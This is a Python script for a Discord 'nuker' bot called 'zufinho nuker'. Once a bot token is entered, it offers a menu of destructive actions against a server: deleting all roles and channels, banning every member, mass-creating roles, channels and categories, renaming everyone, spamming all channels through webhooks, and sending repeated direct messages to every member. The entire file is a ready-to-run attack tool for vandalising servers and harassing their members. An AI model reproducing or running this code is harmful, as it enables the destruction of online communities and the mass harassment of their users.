#made and scripted by zufinho
import os
import time
import random
try:
    import discord
    from discord.ext import commands
    from discord.utils import get
    from discord_webhook import DiscordWebhook

except:
    os.system("pip install discord discord.py discord-webhook && start echo Re-run the program.")

version="2.7.2 - v1"
banner=("""
        
███████╗██╗░░░██╗███████╗██╗███╗░░██╗██╗░░██╗░█████╗░  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
╚════██║██║░░░██║██╔════╝██║████╗░██║██║░░██║██╔══██╗  ████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
░░███╔═╝██║░░░██║█████╗░░██║██╔██╗██║███████║██║░░██║  ██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
██╔══╝░░██║░░░██║██╔══╝░░██║██║╚████║██╔══██║██║░░██║  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
███████╗╚██████╔╝██║░░░░░██║██║░╚███║██║░░██║╚█████╔╝  ██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚══════╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝░╚════╝░  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
""")
bannerstarter=("""

███████╗██╗░░░██╗███████╗██╗███╗░░██╗██╗░░██╗░█████╗░  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
╚════██║██║░░░██║██╔════╝██║████╗░██║██║░░██║██╔══██╗  ████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
░░███╔═╝██║░░░██║█████╗░░██║██╔██╗██║███████║██║░░██║  ██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
██╔══╝░░██║░░░██║██╔══╝░░██║██║╚████║██╔══██║██║░░██║  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
███████╗╚██████╔╝██║░░░░░██║██║░╚███║██║░░██║╚█████╔╝  ██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚══════╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝░╚════╝░  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝

░██████╗████████╗░█████╗░██████╗░████████╗███████╗██████╗░
██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██╔══██╗
╚█████╗░░░░██║░░░███████║██████╔╝░░░██║░░░█████╗░░██████╔╝
░╚═══██╗░░░██║░░░██╔══██║██╔══██╗░░░██║░░░██╔══╝░░██╔══██╗
██████╔╝░░░██║░░░██║░░██║██║░░██║░░░██║░░░███████╗██║░░██║
╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝
""")

prefix="."
os.system("cls")
os.system("title zufinho nuker starter")
while True:
    os.system("cls")
    print(bannerstarter)
    print("version",version)
    print()
    print()
    print("[1] Insert Token                             [2] Run (if u already inserted token)")
    print("[3] Set prefix (prefix predenifed is .)      [4] Exit")
    command=input(">")
    if command=="1":
        os.system("cls")
        print(bannerstarter)
        print("version",version)
        print()
        print()
        print("Insert bot token")
        token=input(">")
        os.system("cls")
        print(bannerstarter)
        print("version ",version)
        print()
        print()
        print("Token changed!")
        time.sleep(1.5)
        os.system("cls")
    if command=="2":
        break
    if command=="3":
        os.system("cls")
        print(bannerstarter)
        print("version ",version)
        print()
        print()
        print("Set the prefix")
        prefix=input(">")
        os.system("cls")
        print(bannerstarter)
        print("version ",version)
        print()
        print()
        print("Prefix changed!")
        time.sleep(1.5)
    if command=="4":
        os.system("cls")
        exit()
os.system("cls")




intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix=prefix, intents=intents)
os.system("title zufinho nuker")

@bot.command()
async def execute(ctx):
    async def spamrole(ctx):
        rolespamcolorinput=0
        print("choose a color:")
        print("[0] Default          [1] Black           [2] Blue")
        print("[3] Green            [4] Purple          [5] Red")
        print("[6] Pink")
        rolespamcolorinput=int(input(">"))
        if rolespamcolorinput==0:
            rolespamcolor=0x808080
        elif rolespamcolorinput==1:
            rolespamcolor=0x000000
        elif rolespamcolorinput==2:
            rolespamcolor=0x0000FF
        elif rolespamcolorinput==3:
            rolespamcolor=0x008000
        elif rolespamcolorinput==4:
            rolespamcolor=0x800080
        elif rolespamcolorinput==5:
            rolespamcolor=0xFF0000
        elif rolespamcolorinput==6:
            rolespamcolor=0xFFCBDB

        print()
        print("roles name:")
        rolespamname=input(">")
        print("amount of roles:")
        rolespamamount=int(input(">"))
        rolespamnumber=0
        while True:
            await guild.create_role(name=rolespamname, color=rolespamcolor)
            print("created role with name",rolespamname)
            if rolespamnumber<rolespamamount:
                rolespamnumber=rolespamnumber+1
            elif rolespamnumber>=rolespamamount:
                print("created role number",rolespamnumber,"with name",rolespamname)
                print("finished")
                print(f"created {rolespamnumber} roles with sucess")
                rolespamnumber=0
                time.sleep(1.5)
                break
    async def delroles(ctx):
        for role in ctx.guild.roles:
            deletedroles=0
            try:  
                await role.delete()
                print(f"role {role.name} deleted")
                deletedroles=deletedroles+1
            except:
                print(f"cannot delete {role.name}")
        print(f"deleted {deletedroles} with sucess")
        time.sleep(1.5)
    async def channelspam(ctx):
        channelspamnumber=0
        print("what name of channels?")
        channelspamname=input(">")
        print()
        print("what type of channel (text/voice)")
        channeltype=input(">")
        print()
        print("amount of channels")
        channelsamount=int(input(">"))
        if channeltype=="voice":
            while True:
                await guild.create_voice_channel(channelspamname)
                if channelspamnumber<channelsamount:
                    channelspamnumber=channelspamnumber+1
                elif channelspamnumber>=channelsamount:
                    print("created channel number",channelspamnumber,"with name",channelspamname,"type text channel")
                    print("finished")
                    time.sleep(1.5)
                    break
                print("created channel number",channelspamnumber,"with name",channelspamname,"type voice channel")
        else:
            while True:
                await guild.create_text_channel(channelspamname)
                if channelspamnumber<channelsamount:
                    channelspamnumber=channelspamnumber+1
                elif channelspamnumber>=channelsamount:
                    print("created channel number",channelspamnumber,"with name",channelspamname,"type text channel")
                    print("finished")
                    time.sleep(1.5)
                    break
                print("created channel number",channelspamnumber,"with name",channelspamname,"type text channel")
    async def delchannels(ctx):
        for channel in ctx.guild.channels:  
            try:
                await channel.delete()
                print(channel,"deleted")
            except:
                print(f"Cannot delete {channel.name}")
        time.sleep(1.5)
    async def categoryspam(ctx):
        categoryspamnumber=0
        print("what name of categorys?")
        categoryspamname=input(">")
        print()
        print()
        print("amount of categorys")
        categoryamount=int(input(">"))
        while True:
            await guild.create_category(categoryspamname)
            if categoryspamnumber<categoryamount:
                categoryspamnumber=categoryspamnumber+1
            elif categoryspamnumber>=categoryamount:
                print("created channel number",categoryspamnumber,"with name",categoryspamname)
                print("finished")
                time.sleep(1.5)
                break
    async def ban(ctx):
        membermany = 0
        memberrestant = 0
        banmembers=0
        whitelist=0
        print("ban reason")
        banreason=input(">")
        print("Add a person to whitelist?")
        whitelistyn=input("(Y/N)>")
        if whitelistyn=="y" or whitelistyn=="Y":
            print("what person id?")
            whitelistid=int(input(">"))
            whitelist=1
        for member in ctx.guild.members:
            print("counting how many members have...")
            print(membermany)
            membermany=membermany+1
        while membermany>memberrestant:
            if whitelist==0:
                for member in ctx.guild.members:
                        try:
                            await member.ban(reason=banreason)
                            print(f"banned {member.display_name}")
                            memberrestant=memberrestant+1
                            banmembers=banmembers+1
                        except:
                            print(f"could not ban {member.display_name}")
                            memberrestant=memberrestant+1
                print(f"{banmembers} members has been banned")
                time.sleep(1.5)
            if whitelist==1:
                for member in ctx.guild.members:
                    if member.id!=whitelistid:
                            try:
                                await member.ban(reason=banreason)
                                print(f"banned {member.display_name}")
                                memberrestant=memberrestant+1
                                banmembers=banmembers+1
                            except:
                                print(f"could not ban {member.display_name}")
                                memberrestant=memberrestant+1
                    else:
                        print(f"{member.name} whitelisted")
                        memberrestant=memberrestant+1
                        continue
                print(f"{banmembers} members has been banned")
                time.sleep(1.5)
    async def nickall(ctx):
        nickallnumber=0
        print("choice a nick to change:")
        nickallname=input(">")
        for member in guild.members:
            try:
                await member.edit(nick=nickallname)
                nickallnumber=nickallnumber+1
                print(f"{member.name} nick has been changed")
            except:
                print(f"cannot change nick of {member.name}")
        print(f"finished with {nickallnumber} peoples nickname changed to {nickallname}")
        time.sleep(1.5)
    async def webhookspam(ctx):
        guild = ctx.guild
        messagespamtimes=0
        messagespammany=0
        print("insert message:")
        messagespammessage=input(">")
        print()
        print("repeat how many times")
        messagespamtimes=int(input(">"))
        while messagespamtimes>messagespammany:
            for channel in guild.channels:
                try:
                    webhookcreate = await channel.create_webhook(name="zufinho nuker")
                    print(f"created webhook at {channel.name} channel")
                    webhook = DiscordWebhook(url=webhookcreate.url,timeout=1,rate_limit_retry=False,content=messagespammessage)
                    webhooksender = webhook.execute()
                    print(f"send message to channel {channel.name}")
                    messagespammany=messagespammany+1
                except:
                    print(f"cannot create webhook and send at channel {channel.name} ")
                    messagespamtimes=messagespamtimes-1
            time.sleep(1.5)
    async def changeservername(ctx):
        print("Choice a name to changes server name:")
        changeservernamename=input(">")
        await ctx.guild.edit(name=changeservernamename)
        print(f"server name changed to {changeservernamename}")
        time.sleep(1.5)
    async def roletoall(ctx):
        roleallcolorinput=0
        print("choose a color:")
        print("[0] Default          [1] Black           [2] Blue")
        print("[3] Green            [4] Purple          [5] Red")
        print("[6] Pink")
        roleallcolorinput=int(input(">"))
        if roleallcolorinput==0:
            roleallcolor=0x808080
        elif roleallcolorinput==1:
            roleallcolor=0x000000
        elif roleallcolorinput==2:
            roleallcolor=0x0000FF
        elif roleallcolorinput==3:
            roleallcolor=0x008000
        elif roleallcolorinput==4:
            roleallcolor=0x800080
        elif roleallcolorinput==5:
            roleallcolor=0xFF0000
        elif roleallcolorinput==6:
            roleallcolor=0xFFCBDB
        print()
        print("role name:")
        roleallname=input(">")
        roletoallrole = await guild.create_role(name=roleallname, color=roleallcolor,hoist=True)
        role = get(guild.roles, id=roletoallrole.id)
        for member in guild.members:
            try:
                await member.add_roles(role)
                print(f"added role to {member.name}")
            except:
                print(f"cannot add role to {member.name}")
        time.sleep(1.5)
    async def invitespam(ctx):
        for channel in guild.channels:
            try:
                await ctx.channel.create_invite(max_age = 300)
                print(f"created invite at channel {channel.name}")
            except:
                print(f"cannot create invite at channel {channel.name}")
    async def dmspam(ctx):
        print("message:")
        dmspammessage=input(">")
        print("amount messages per dm")
        repeathowmany=int(input(">"))
        for member in guild.members:
            dmspamamount=0
            try:
                user = await bot.fetch_user(member.id)
                await user.send(dmspammessage)
                print(f"send message to {member.name}")
                while repeathowmany>dmspamamount:
                    user = await bot.fetch_user(member.id)
                    await user.send(dmspammessage)
                    print(f"send message to {member.name}")
                    dmspamamount=dmspamamount+1
                    
            except:
                print(f"cannot send message to {member.name}")
        time.sleep(2.5)
    guild = ctx.guild
    while True:
        os.system("cls")
        print(banner)
        print("version ",version)
        print()
        print("if several error messages appear in THIS menu, just press enter, this is normal.")
        print()
        print()
        print("[1] Role spammer                        [2] Role deleter")
        print("[3] Channel spam                        [4] Channel-category deleter")
        print("[5] Category spam                       [6] Ban all")
        print("[7] Change nick all                     [8] Webhook spam all channels")
        print("[9] Change server name                  [10] Add a role to all")
        print("[11] Invite spammer (VERY SLOW)         [12] DM spam all members")
        commandnuker="gosei"
        commandnuker=input(">")
        if commandnuker=="1":
            os.system("cls")
            print(banner)
            print()
            print("version ",version)
            print()
            print()
            print()
            await spamrole(ctx)
        elif commandnuker=="2":
            os.system("cls")
            print(banner)
            print()
            print("version ",version)
            print()
            print()
            print()
            await delroles(ctx)
        elif commandnuker=="3":
            os.system("cls")
            print(banner)
            print()
            print("version ",version)
            print()
            print()
            print()
            await channelspam(ctx)
        elif commandnuker=="4":
            os.system("cls")
            print(banner)
            print()
            print("version ",version)
            print()
            print()
            print()
            await delchannels(ctx)
        elif commandnuker=="5":
            os.system("cls")
            print(banner)
            print("version",version)
            print()
            print()
            await categoryspam(ctx)
        elif commandnuker=="6":
            os.system("cls")
            print(banner)
            print()
            print("version ",version)
            print()
            print()
            print()
            await ban(ctx)
        elif commandnuker=="7":
            os.system("cls")
            print(banner)
            print()
            print("version ",version)
            print()
            print()
            print()
            await nickall(ctx)
        elif commandnuker=="8":
            os.system("cls")
            print(banner)
            print()
            print("version ",version)
            print()
            print()
            print()
            await webhookspam(ctx)
        elif commandnuker=="9":
            os.system("cls")
            print(banner)
            print()
            print("version ",version)
            print()
            print()
            print()
            await changeservername(ctx)
        elif commandnuker=="10":
            os.system("cls")
            print(banner)
            print()
            print("version ",version)
            print()
            print()
            print()
            await roletoall(ctx)
        elif commandnuker=="11":
            os.system("cls")
            print(banner)
            print()
            print("version ",version)
            print()
            print()
            print()
            await invitespam(ctx)
        elif commandnuker=="12":
            os.system("cls")
            print(banner)
            print()
            print("version ",version)
            print()
            print()
            print()
            await dmspam(ctx)
        else:
            os.system("cls")
print(f"digit {prefix}execute in a chat to start nuker")
bot.run(token)
